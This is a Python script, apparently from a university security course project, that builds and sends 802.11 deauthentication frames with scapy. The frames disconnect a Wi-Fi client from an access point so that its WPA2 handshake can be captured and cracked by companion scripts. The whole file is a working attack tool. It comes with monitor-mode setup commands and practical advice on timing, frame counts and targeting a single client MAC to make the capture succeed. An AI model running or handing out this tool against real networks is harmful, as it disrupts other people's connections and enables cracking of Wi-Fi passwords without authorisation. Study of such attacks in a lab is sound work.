#!/usr/bin/env python3
"""
deauth.py  --  CSE 406 Project (Topic 20)

Sends a SMALL, PULSED burst of 802.11 deauthentication frames to nudge a
connected client off an access point. When the client reconnects it performs
the WPA2 4-way handshake again -- which capture.py records so crack.py can
attack it.

WHY PULSED, NOT A FLOOD (this is the important part):
    To capture a handshake you do NOT want a continuous deauth flood. A flood
    keeps knocking the client off *in the middle* of every reconnect attempt,
    so the AP emits Msg1 after Msg1 (each with a fresh ANonce) but the client
    never gets a quiet window to finish Msg2/Msg3/Msg4. The .cap then fills
    with mismatched partial handshakes and crack.py reports the *correct*
    password as wrong (its Msg2 has no matching Msg1/ANonce in the file).
    iPhones in particular will just refuse to reassociate while flooded.

    So we send a FEW frames, then GO QUIET for a few seconds to let the
    client reconnect and complete ONE clean 4-way handshake, then optionally
    repeat. This is the aireplay-ng "-0 <small count>" idea, done by hand.

We CRAFT THE FRAME OURSELVES with scapy (RadioTap / Dot11 / Dot11Deauth).
We do NOT call aireplay-ng. This is the "craft your own frame" deliverable.

Prep (once, in another pane), to put the NIC in monitor mode on the AP channel:
    sudo airmon-ng start wlan0 11        # 11 = config.CHANNEL
    # (or the manual: ip link set wlan0 down; iw wlan0 set monitor control;
    #  ip link set wlan0 up; iw wlan0 set channel 11)

Typical use -- run capture.py in one pane, then in another:
    sudo python3 deauth.py                       # broadcast, gentle default
    sudo python3 deauth.py 5e:33:8c:67:33:fe     # target one client (MORE reliable)
    sudo python3 deauth.py 5e:33:8c:67:33:fe --rounds 3 --frames 5 --wait 5

INTERFACE / AP_MAC (BSSID) / CHANNEL come from config.py. With no client MAC
(and an empty config.CLIENT_MAC) we broadcast to ff:ff:ff:ff:ff:ff. NOTE:
targeting a specific client MAC is more reliable -- many phones ignore
broadcast deauth frames entirely.
"""

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import argparse
import subprocess
import time

import config

# ---- fixed target info (see config.py) ---------------------------------
INTERFACE = config.MONITOR_INTERFACE
AP_MAC    = config.BSSID                 # BSSID of target AP
CHANNEL   = config.CHANNEL               # AP's channel -- MUST match, or frames go nowhere
BROADCAST = "ff:ff:ff:ff:ff:ff"          # deauth every client at once
REASON    = 7                            # 802.11 reason 7 = class-3 frame from nonassociated STA

# Gentle defaults -- deliberately small so the client can reconnect cleanly.
DEFAULT_ROUNDS = 3     # how many nudge-then-wait cycles
DEFAULT_FRAMES = 5     # frames per client per round (a nudge, NOT a flood)
DEFAULT_WAIT   = 5     # seconds of SILENCE after each round, so the client can
                       #   reconnect and complete a full 4-way handshake
# -----------------------------------------------------------------------


def set_channel():
    """Park the monitor interface on the AP's channel. If this is wrong, the
    deauth frames are transmitted on a different channel and never reach the
    AP or its clients -- the single most common reason 'deauth does nothing'."""
    if not CHANNEL:
        print("[!] config.CHANNEL is empty -- cannot verify the interface channel.")
        return
    result = subprocess.run(
        ["iw", "dev", INTERFACE, "set", "channel", str(CHANNEL)],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        print(f"[!] Could not set channel {CHANNEL} on {INTERFACE}: {result.stderr.strip()}")
        print(f"    Set it manually: sudo iw dev {INTERFACE} set channel {CHANNEL}")
        print(f"    (Is {INTERFACE} really in monitor mode? See the prep steps at the top.)")
    else:
        print(f"[*] {INTERFACE} set to channel {CHANNEL}")


def build_deauth(dst, src, bssid):
    """Return ONE 802.11 deauth frame addressed dst<-src inside BSS 'bssid'."""
    # RadioTap()          : the radio header the driver needs to inject a frame
    # Dot11(...)          : the 802.11 MAC header
    #     type=0 subtype=12 -> management frame, subtype 12 = deauthentication
    #     addr1 = receiver (DA), addr2 = transmitter (SA), addr3 = BSSID
    # Dot11Deauth(reason) : the deauth body carrying the reason code
    # The '/' operator in scapy stacks one layer on top of the next.
    return (RadioTap() /
            Dot11(type=0, subtype=12, addr1=dst, addr2=src, addr3=bssid) /
            Dot11Deauth(reason=REASON))


def parse_args():
    p = argparse.ArgumentParser(description="Gentle, pulsed WPA2 deauth to trigger a re-handshake.")
    p.add_argument("client", nargs="?", default=None,
                   help="MAC of the client to deauth (default: config.CLIENT_MAC, "
                        "else broadcast). Targeting one client is more reliable.")
    p.add_argument("--rounds", type=int, default=DEFAULT_ROUNDS,
                   help=f"nudge-then-wait cycles (default: {DEFAULT_ROUNDS})")
    p.add_argument("--frames", type=int, default=DEFAULT_FRAMES,
                   help=f"frames per client per round -- keep small (default: {DEFAULT_FRAMES})")
    p.add_argument("--wait", type=float, default=DEFAULT_WAIT,
                   help=f"seconds of silence after each round (default: {DEFAULT_WAIT})")
    return p.parse_args()


def main():
    args = parse_args()

    client = args.client or config.CLIENT_MAC or BROADCAST
    broadcast = (client.lower() == BROADCAST)

    # Frame A: tell the CLIENT (or everyone) it is deauthenticated from the AP.
    to_client = build_deauth(dst=client, src=AP_MAC, bssid=AP_MAC)
    # Frame B: tell the AP that this CLIENT has left (helps trigger a
    # re-handshake). Invalid for broadcast -- a frame can't have a broadcast
    # SOURCE address -- so it's only sent when a specific client is targeted.
    to_ap = None if broadcast else build_deauth(dst=AP_MAC, src=client, bssid=AP_MAC)

    set_channel()

    target = "ALL clients (broadcast -- some phones ignore this)" if broadcast else client
    print(f"[*] Target : {target}")
    print(f"[*] AP     : {AP_MAC}  on {INTERFACE} (channel {CHANNEL})")
    print(f"[*] Plan   : {args.rounds} round(s) of {args.frames} frame(s), "
          f"then {args.wait}s of SILENCE each so the client can reconnect cleanly.")
    print("[*] Keep capture.py running in another pane. Ctrl+C to stop early.\n")

    try:
        for r in range(1, args.rounds + 1):
            # A short nudge: a handful of frames, sent once, back to back.
            sendp(to_client, iface=INTERFACE, count=args.frames, verbose=False)
            if to_ap is not None:
                sendp(to_ap, iface=INTERFACE, count=args.frames, verbose=False)
            print(f"[>] Round {r}/{args.rounds}: sent {args.frames} deauth frame(s). "
                  f"Going quiet for {args.wait}s so it can reconnect...")
            time.sleep(args.wait)          # SILENCE -- this is what lets the handshake complete
    except KeyboardInterrupt:
        print("\n[*] Stopped by user.")

    print("\n[+] Done. Check capture.py -- it should have logged a fresh Msg1..Msg4.")
    print("    If it only ever shows Msg1 (no Msg2), you are still deauthing too hard:")
    print("    lower --frames, raise --wait, and prefer targeting one client MAC.")


if __name__ == "__main__":                 # run main() only when executed
    main()                                 # directly (not when imported)
